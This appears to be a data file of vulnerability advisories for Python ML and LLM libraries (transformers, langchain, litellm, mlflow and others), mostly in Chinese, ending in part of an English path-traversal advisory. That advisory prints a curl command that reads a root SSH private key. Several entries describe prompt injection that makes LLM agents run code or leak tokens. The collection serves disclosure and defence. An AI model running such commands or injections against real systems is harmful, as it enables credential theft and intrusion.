mlflow_mlflow,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
mlflow_mlflow,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
mlflow_mlflow,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
mlflow_mlflow,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
mlflow_mlflow,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
mlflow_mlflow,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
mlflow_mlflow,llama_index,,True,,,,<p>llama-index 是一个用于处理和检索嵌入式表格数据的开源 Python 库。该库的 EmbeddedTablesUnstructuredRetrieverPack 组件使用 pickle.load 函数加载包文件，而该函数在没有任何限制的情况下处理数据，使受害用户在调用时容易受到代码执行攻击。攻击者可以通过构造恶意的 pickle 文件来执行任意代码，造成安全隐患。</p>,2,1
mlflow_mlflow,langchain,,True,CVE-2023-34540,CWE-94,2023-06-14,"LangChain是通过可组合性使用 LLM 构建应用程序。
Langchain 0.0.171版本存在安全漏洞，该漏洞源于存在任意代码执行漏洞。",1,2
mlflow_mlflow,langchain,,True,CVE-2023-29374,CWE-74,2023-04-05,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 LangChain 0.0.131及之前版本存在安全漏洞，该漏洞源于允许快速注入攻击，攻击者利用该漏洞可以执行任意代码。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-34541,CWE-100001,2023-06-20,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Langchain 0.0.171版本存在安全漏洞，该漏洞源于存在任意代码执行漏洞。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-44467,CWE-78,2023-10-09,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 LangChain langchain_experimental 0.0.14版本存在安全漏洞，该漏洞源于允许攻击者绕过 CVE-2023-36258 修复，并通过 python exec 方法中的 PALChain 执行任意代码。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-32786,CWE-74,2023-10-20,"LangChain是通过可组合性使用 LLM 构建应用程序。
Langchain 0.0.155及之前版本存在安全漏洞，该漏洞源于存在服务器请求伪造（SSRF）漏洞。",2,2
mlflow_mlflow,langchain,,True,CVE-2023-32785,,,LangChain 是一个用于通过可组合性使用 LLM 构建应用程序的 Python 库。该库提供了多种功能模块，例如与数据库交互的功能模块 `db_chain()`，可以帮助开发者构建复杂的自然语言处理和数据管理应用程序。在版本 0.0.247 之前，LangChain 存在 SQL 注入漏洞。漏洞的根本原因是 `db_chain()` 对用户输入的参数缺乏严格的校验。攻击者可以通过构造恶意的 SQL 查询，绕过正常的查询逻辑并执行任意的 SQL 指令。这种漏洞利用了组件在用户输入与数据库查询之间缺乏信任边界的设计缺陷。攻击者可通过该漏洞直接访问或篡改数据库中的敏感数据，甚至对数据库进行破坏。,3,2
mlflow_mlflow,langchain,,True,CVE-2023-46229,CWE-918,2023-10-19,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain 0.0.317 版本之前存在安全漏洞，该漏洞源于通过 document_loaders/recursive_url_loader.py 可以进行服务器端请求伪造攻击，因为爬取可以从外部服务器进行到内部服务器。",2,0
mlflow_mlflow,langchain,,True,CVE-2023-39659,CWE-74,2023-08-15,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.232 版本存在安全漏洞，该漏洞源于通过 PythonAstREPLTool._run 组件可以执行任意代码。",1,2
mlflow_mlflow,langchain,,True,CVE-2023-39631,CWE-94,2023-09-01,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Langchain v.0.0.245版本存在安全漏洞，该漏洞源于允许远程攻击者通过numexpr库中的评估函数执行任意代码。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-36281,CWE-94,2023-08-22,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.171版本存在代码注入漏洞，该漏洞源于允许远程攻击者通过 json 文件及 load_prompt 参数执行任意代码。",1,1
mlflow_mlflow,langchain,,True,CVE-2023-38896,CWE-74,2023-08-15,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 langchain 0.0.194 版本及之前版本存在安全漏洞，该漏洞源于通过 from_math_prompt 和 from_colored_object_prompt 函数可以执行任意代码。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-38860,CWE-94,2023-08-15,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.231版本存在安全漏洞，该漏洞源于允许远程攻击者通过提示参数执行任意代码。",1,2
mlflow_mlflow,langchain,,True,CVE-2023-36095,CWE-94,2023-08-05,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Harrison Chase langchain v.0.0.194版本存在代码注入漏洞，该漏洞源于from_math_prompt(llm).run存在任意代码执行漏洞。</p>,1,2
mlflow_mlflow,langchain,,True,CVE-2023-36258,CWE-94,2023-07-03,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.199版本存在安全漏洞，该漏洞源于允许攻击者通过 python exec 方法中的 PALChain 执行任意代码。",1,2
mlflow_mlflow,langchain,,True,CVE-2023-36188,CWE-74,2023-07-06,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.64版本存在安全漏洞，该漏洞源于允许攻击者通过Python exec方法中的PALChain参数执行任意代码。",1,2
mlflow_mlflow,langchain,,True,CVE-2023-36189,CWE-89,2023-07-06,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.64版本存在SQL注入漏洞，该漏洞源于存在SQL注入漏洞，允许远击者通过SQLDatabaseChain组件获取敏感信息。",2,2
mlflow_mlflow,langchain,,True,CVE-2024-28088,CWE-22 CWE-31,,<p>LangChain 是一个用于通过可组合性构建应用程序的开源库，允许开发者在构建语言模型（LLM）的应用时轻松处理不同配置。当调用 `load_chain` 函数时，由于用户输入的路径参数未进行适当验证，导致存在路径遍历的漏洞。攻击者可以通过操控路径参数来遍历目录，加载不应被应用加载的配置或执行代码。这种攻击只在攻击者能够控制路径参数的最后部分时可被触发。使用示例代码可以利用该漏洞进行远程代码执行或泄露敏感信息。</p>,2,1
mlflow_mlflow,langchain,,True,CVE-2024-3571,CWE-22,,<p>LangChain 是一个用于构建应用程序的工具，利用大型语言模型（LLMs）进行可组合性开发。该组件的 `LocalFileStore` 功能由于对文件路径的限制不够严格，存在路径遍历漏洞。攻击者可以利用此漏洞在文件系统中的任意位置读取或写入文件，从而导致信息泄露或远程代码执行。漏洞根源在于 `mset` 和 `mget` 方法中用户输入未经过妥善清理，允许目录遍历序列到达意外目录。</p>,3,1
mlflow_mlflow,langchain,,True,CVE-2024-3095,CWE-918,,<p>LangChain 是一个通过可组合性构建应用程序的框架。该框架中的 Web Research Retriever 组件存在服务器端请求伪造 (SSRF) 漏洞。该漏洞发生的根本原因是该组件未对请求进行适当限制，允许其访问本地地址。攻击者利用该漏洞可以进行端口扫描、访问本地服务，并在云环境中读取实例元数据。尽管只允许通过 GET 请求进行攻击，但仍可能会影响机密性、完整性和可用性。</p>,3,1
mlflow_mlflow,langchain,,True,CVE-2024-5998,CWE-502,,<p>LangChain 是一个开源的 Python 库，旨在通过组合性构建基于大语言模型的应用程序。在其 FAISS.deserialize_from_bytes 函数中，存在不信任数据的 pickle 反序列化漏洞。此漏洞的根源在于未能充分验证反序列化后的数据有效性，攻击者可以通过操控输入数据来执行任意命令，利用 os.system 函数。利用此漏洞，攻击者只需向应用程序发送恶意构造的序列化数据即可触发该漏洞。</p>,3,1
mlflow_mlflow,langchain,,True,CVE-2024-8309,CWE-89 CWE-74,,<p>LangChain 是一个开源框架，用于开发由大型语言模型（LLM）支持的应用程序。版本 0.2.5 存在 SQL 注入漏洞，此漏洞源于 GraphCypherQAChain 类的不充分输入验证，攻击者可以通过提示注入恶意 SQL 命令来操纵、删除或创建数据。这可能导致未经授权的数据操纵、服务中断、数据泄露、多租户环境的安全漏洞和数据完整性问题。</p>,4,1
mlflow_mlflow,langchain,,True,,,,<p>LangChain 是一个用于构建自然语言处理应用的 Python 库。版本 0.0.353 的 langchain_experimental 允许攻击者绕过 AST 验证中的检查，通过 Python exec 方法执行任意代码。此漏洞发生在通过 PALChain 调用代码时，通过不当处理的验证逻辑，攻击者能够注入恶意代码并造成远程代码执行。</p>,1,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个用于处理区块链数据的 Python 库。该库的 Blockchain Document Loader 模块存在一个服务器端请求伪造漏洞，攻击者可以利用此漏洞向内部 HTTP(s) 服务器发送未经授权的请求，从而访问敏感数据或中断服务。该漏洞的根本原因在于代码中的用户输入未经过正确验证，允许攻击者注入任意 URL。具体来说，攻击者可以构造一个恶意的请求，通过 langchain 库中的 load() 函数触发，这可能导致数据泄露、服务中断甚至远程代码执行。</p>,2,1
mlflow_mlflow,langchain,,True,,,,<p>langchain_community是一个基于Python的开源库，旨在简化图形数据库与机器学习的集成。此漏洞存在于Neo4jVector类中，导致对用户输入的清理不足，允许攻击者通过node_label或embedding_node_property进行Cypher注入。攻击者可以通过不安全的用户输入创建、修改或删除数据库中的节点。</p>,1,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个用于构建语言模型应用程序的Python库。该漏洞影响到用 Playwright 浏览器工具包创建的 LLM 浏览器 AI 代理，当目标网站中包含 visibility:hidden 的元素时，外部攻击者可以通过恶意提示获取这些元素的值。这些元素可能包含用于安全目的的令牌，如 CSRF 令牌，此外在 OAuth 2.0 response_mode=form_post 中，包含了用于身份验证和授权的 ID 令牌和访问令牌。这一漏洞的根本原因在于在处理隐藏字段时缺乏严格的安全机制，从而导致通过被注入的恶意代码泄露重要的安全令牌。</p>,3,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain是一个用于处理文档的Python库，通过多个数据源加载器提取信息。当开发者将这些加载器的参数暴露给不可信的来源时，可能会导致XXE漏洞的出现。此漏洞的根本原因在于对外部实体的处理不当，攻击者可以通过构造恶意XML文件，利用XXE漏洞读取服务器上的敏感文件，如配置文件、源代码文件和数据备份等。此外，攻击者还可以利用该漏洞强制应用程序向内部或外部服务发送请求，可能对其他内部系统构成安全威胁。</p>,1,1
mlflow_mlflow,langchain,,True,,,,<p>TiDBChatMessageHistory 类是 langchain 库的一部分，该类用于管理聊天消息的历史记录并从数据库加载消息。该漏洞源于对 parameters 参数 (earliest_time) 的类型未进行验证，攻击者可以通过构造恶意输入来控制数据库查询。具体而言，攻击者可以在 _load_messages_to_cache 方法中传入恶意的 earliest_time 值，从而执行任意 SQL 查询。这使得攻击者能够窃取数据库内容。</p>,3,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个用于构建 AI 应用程序的框架，TFIDFRetriever 是该框架中的一个类，用于处理文本检索。然而，该类中的 load_local() 方法在加载向量化器和文档时，使用了 untrusted pickle 文件的 deserialize，而没有进行相应的内容验证，导致可能执行恶意的 Python 代码。攻击者可以通过构造恶意的 pickle 文件，在应用程序加载该文件时执行任意命令，造成严重的安全问题。</p>,1,1
mlflow_mlflow,langchain,,True,,,,<p>MRKLOutputParser 是 Langchain 库中的一个输出解析器，负责解析输入文本并确定相应的操作。然而，该组件的 'parse' 函数未能有效处理输入文本中的正则表达式，当文本中包含恶意输入时，可能导致拒绝服务（ReDoS）攻击。由于正则表达式的执行时间与输入大小呈指数关系，恶意输入可能导致解析时间显著增加，进而使服务器变得不可用。</p>,3,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个开源的 Python 库，用于构建大语言模型(LLM)应用程序。此漏洞出现在通过 `create_sql_agent` 实现的数据分析功能中，攻击者可以发送特制的查询来读取和写入文件，进而可能导致远程代码执行(RCE)。具体来说，通过构造特定的 SQL 查询，攻击者可以利用 PostgreSQL 的功能，将恶意代码写入文件或读取敏感信息。</p>,1,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个用于简化文档加载和处理的 Python 库，具有灵活性和可扩展性。该漏洞允许攻击者使用 'file://' URL 方案从服务器读取任意文件的内容，进而导致敏感信息泄露。具体来说，漏洞源于 PlaywrightWebBaseLoader 组件未能正确限制用户输入，攻击者能够触发页面内容加载任意文件。通过构造特定的请求，攻击者可以下载配置文件、环境变量等敏感信息。</p>,3,1
mlflow_mlflow,langchain,,True,,,,<p>BibtexLoader 是 Langchain 社区的一个组件，旨在从 bib 文件中提取引用的文献并加载相关的 PDF 文件。该漏洞是由文件名未经过验证引起的，允许攻击者读取位于 bib 文件目录以外的任意 PDF 文件。例如，攻击者可以通过构造特定的 bibtex 条目来访问上层目录中的 '1.pdf' 文件，从而导致未授权的数据访问。</p>,3,1
mlflow_mlflow,langchain,,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
mlflow_mlflow,dspy,!=2.6.9,True,CVE-2025-12695,CWE-653,2025-11-04,<p>DSPy 是一个用于构建人工智能代理的开发工具，其主要功能是通过构造 AI 代理来处理用户输入，并支持通过 'PythonInterpreter' 类执行 Python 代码。该漏洞的产生是由于 DSPy 的沙箱配置过于宽松，未对用户输入进行充分的隔离与校验，攻击者可以通过构造特定的恶意输入，绕过沙箱限制并与沙箱中的 Python 环境交互。这种交互能够进一步被利用来访问系统底层文件系统，从而读取敏感文件。CWE-653 的引用表明问题的根源在于沙箱的隔离机制不完善，未能有效地限制脚本的执行范围。</p>,2,2
mlflow_mlflow,litellm,,True,CVE-2024-4888,CWE-862,,LiteLLM 是 Berri AI 开源的一个应用程序，允许用户方便地与 LLM API 提供商进行交互。该应用程序的 `/audio/transcriptions` 接口存在输入验证错误，攻击者可以通过发送特制请求，从代理服务器中删除指定的文件而不进行适当的授权或验证。这一漏洞的根本原因在于代码中对用户输入的验证不足，尤其是在用 `os.remove(file.filename)` 删除文件时，允许任何用户删除对服务器而言至关重要的文件，例如 SSH 密钥、SQLite 数据库或配置文件。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-5225,CWE-89,,LiteLLM 是 Berri AI 开源的一个应用程序，旨在通过 OpenAI 格式调用所有 LLM API。该应用程序在1.40.4版本及之前存在 SQL 注入漏洞。漏洞的根本原因是不当处理 SQL 命令中的特殊元素，攻击者可以通过注入恶意 SQL 命令到 api_key 参数，从而实现未授权访问。恶意数据直接连接到查询中，导致 SQL 注入漏洞的发生。成功利用此漏洞可能导致未经授权的访问、数据操纵、机密信息泄露及拒绝服务(DoS)。,3,1
mlflow_mlflow,litellm,,True,CVE-2024-2952,CWE-76,,LiteLLM 是 Berri AI 开源的一个应用程序，旨在简化与 LLM API 的接口。该漏洞源于在 `hf_chat_template` 方法中，对 `tokenizer_config.json` 文件中 `chat_template` 参数的处理缺乏适当的清理，导致容易受到服务器端模板注入(SSTI)攻击。攻击者可以通过构造恶意的 `tokenizer_config.json` 文件，执行任意代码。,1,1
mlflow_mlflow,litellm,,True,CVE-2024-4889,CWE-94,,LiteLLM是Berri AI开源的一个应用程序，用于使用OpenAI格式调用所有LLM API。该应用程序存在代码注入漏洞，源于在秘密管理系统中的`eval`函数内使用了未经验证的输入。攻击者可以通过在`get_image`函数中将`UI_LOGO_PATH`变量设置为远程服务器地址，写入恶意的Google KMS配置文件到`cached_logo.jpg`文件中。然后，通过将恶意代码分配给`SAVE_CONFIG_TO_DB`环境变量，执行任意代码，从而实现对系统的完全控制。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-4264,CWE-94,,LiteLLM 是 Berri AI 开源的一个应用程序，允许用户通过 OpenAI 格式调用所有大型语言模型 (LLM) API。该应用存在代码注入漏洞，根本原因是对代码生成过程的不当控制。在 `litellm.get_secret()` 方法中，攻击者可以通过 `/config/update` 端点注入恶意值到环境变量，从而在未进行任何数据清洗的情况下对 `eval` 函数传递不可信的数据，导致远程代码执行 (RCE) 漏洞。,1,1
mlflow_mlflow,litellm,,True,CVE-2024-5710,CWE-862,,LiteLLM是LiteLLM开源的一个应用程序，可用于简化与各种大语言模型API的交互。该程序的1.34.34版本存在访问控制错误漏洞，源于团队管理功能中的访问控制不当。攻击者可以未授权地创建、更新、查看、删除、阻止和取消阻止任何团队，并且可以向任何团队添加或删除任何成员。,3,1
mlflow_mlflow,litellm,,True,CVE-2024-5751,CWE-94,,LiteLLM是一个开源的应用程序，旨在简化与大型语言模型（LLM）API的调用。LiteLLM v1.35.8版本存在代码注入漏洞，该漏洞的根源在于其add_deployment函数，它会解码和解密环境变量，并将其赋值给os.environ。攻击者可以通过向/config/update端点发送恶意负载利用该漏洞，这会在调用get_secret函数时被处理和执行。这一过程要求服务器使用Google KMS和数据库来存储模型。,1,1
mlflow_mlflow,litellm,,True,CVE-2024-6587,CWE-918,,<p>LiteLLM是一个创新的代理和库，旨在简化多种大型语言模型（LLMs）API的集成过程。LiteLLM 1.38.10版本易受服务器端请求伪造（SSRF）漏洞的攻击，攻击者可以通过请求中的api_base参数注入恶意域名。这种缺乏验证的参数可以使攻击者捕获OpenAI API密钥，从而在不经过代理的情况下直接访问API，造成潜在滥用。</p>,2,1
mlflow_mlflow,litellm,,True,CVE-2024-4890,CWE-89,,LiteLLM是Berri AI开源的一个应用程序，旨在方便与多个大型语言模型（LLM）API提供商进行交互。该应用程序在处理 `/team/update` 过程中存在SQL注入漏洞，攻击者可以通过向 `user_id` 参数注入恶意的SQL命令，提取或操作敏感数据。详细的攻击示例包括通过发送带有特制 `user_id` 的请求进行SQL命令的注入，从而获得敏感信息。,3,1
mlflow_mlflow,litellm,,True,CVE-2025-0628,CWE-266,,BerriAI/litellm 是一个基于Python的开源人工智能应用程序，旨在提供用户友好的机器学习功能。在其主流最新版本中存在不当的授权漏洞。当具有 'internal_user_viewer' 角色的用户登录应用时，会意外地获得一个权限过高的API密钥。该密钥能够访问应用的所有管理员功能，包括 '/users/list' 和 '/users/get_users' 等端点。此漏洞允许在应用内进行权限提升，使任何账户都能成为 PROXY ADMIN，从而导致了潜在的权限滥用。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-9606,CWE-117 CWE-116,,LiteLLM 是 Berri AI 开源的一个应用程序，可以使用 OpenAI 格式调用所有 LLM API。该漏洞出现在 LiteLLM 的 1.44.12 版本之前，具体体现在 `litellm/litellm_core_utils/litellm_logging.py` 文件中的 API 密钥掩码代码仅掩码前 5 个字符。这导致几乎整个 API 密钥在日志中泄露，暴露了大量的秘密密钥。该问题影响到版本 v1.44.9。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-10188,CWE-400,,LiteLLM是由Berri AI开源的一个应用程序，旨在通过OpenAI格式调用所有LLM API。该应用存在拒绝服务漏洞（CVE-2024-10188）。该漏洞的根本原因是使用了不安全的ast.literal_eval解析用户输入，这导致未认证的用户可以利用该函数进行拒绝服务攻击，从而使litellm Python服务器崩溃。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-8984,CWE-770,,LiteLLM 是 Berri AI 开源的一个应用程序，它允许用户使用 OpenAI 格式调用所有 LLM API。LiteLLM v1.44.5 版本存在拒绝服务漏洞，该漏洞来源于未正确处理 HTTP 请求中的多部分边界。攻击者通过在多部分边界末尾附加字符（例如短横线 -），导致服务器持续处理每个字符，进而消耗大量资源并使服务不可用。此漏洞是完全未经身份验证的，不需要任何用户交互，影响所有使用此服务的用户。,2,1
mlflow_mlflow,litellm,,True,CVE-2025-0330,CWE-1230,,在 berriai/litellm 版本 v1.52.1 中，proxy_server.py 文件存在一个漏洞：当解析团队设置时发生错误时，会导致 Langfuse API 密钥泄露。该漏洞会暴露包含 langfuse_secret 和 langfuse_public_key 等敏感信息，这些密钥可提供对存储所有请求的 Langfuse 项目的完全访问权限。,2,1
mlflow_mlflow,litellm,,True,CVE-2024-6825,CWE-94,,LiteLLM 是由 Berri AI 开源的应用程序，支持使用 OpenAI 格式调用所有 LLM API。LiteLLM 版本 1.40.12 存在远程代码执行漏洞，该漏洞源于对 'post_call_rules' 配置处理的不当。该配置允许添加回调函数，所提供的值在最后一个 '.' 字符处分割，最后部分被视为函数名，其余部分被附加 '.py' 后缀并导入。这使得攻击者能够将系统方法（例如 'os.system'）设置为回调，从而在处理聊天响应时执行任意命令。,2,1
mlflow_mlflow,haystack-ai,,True,CVE-2024-41950,CWE-1336,2024-07-31,"Haystack是deepset开源的一个开源 NLP 框架，可使用 Transformer 模型和 LLM（GPT-4、ChatGPT 等）与用户的数据进行交互。
Haystack 2.3.1之前版本存在安全漏洞。攻击者利用该漏洞可以导致远程代码执行。",4,0
mlflow_mlflow,black,23.7.0,True,CVE-2024-21503,CWE-1333 CWE-75,2024-03-18,"Black是一个 Python 代码格式化程序。
black 24.3.0 之前版本存在安全漏洞，该漏洞源于 strings.py 文件中的lines_with_leading_tabs_expanded 函数容易受到拒绝服务攻击，攻击者利用该漏洞可以通过制作恶意输入导致拒绝服务。",3,2
mlflow_mlflow,mlflow,,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,,True,,,2023-05-01,"### Impact

Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

The vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.

### Patches

This vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.

### Workarounds
If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.

### References
",1,-2
mlflow_mlflow,mlflow,,True,,CWE-23,2023-05-04,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Relative Path Traversal due to allowing the ability to provide relative paths in registered model sources. 

**Note:**

This issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

## Workaround

Users who are unable to upgrade to the fixed version should limit who can access MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub Commit](https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342)
- [GitHub Issue](https://github.com/mlflow/mlflow/issues/8273)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
- [GitHub Release](https://github.com/mlflow/mlflow/releases/tag/v2.3.1)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-284,2023-05-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Access Restriction Bypass. Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands  may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way. The vulnerability is very similar to [CVE-2023-1177](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-3373049)

## Workarounds
If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-22,2023-07-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Directory Traversal via the function `_validate_non_local_source_contains_relative_paths` due to improper validation of the 'source' parameter.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
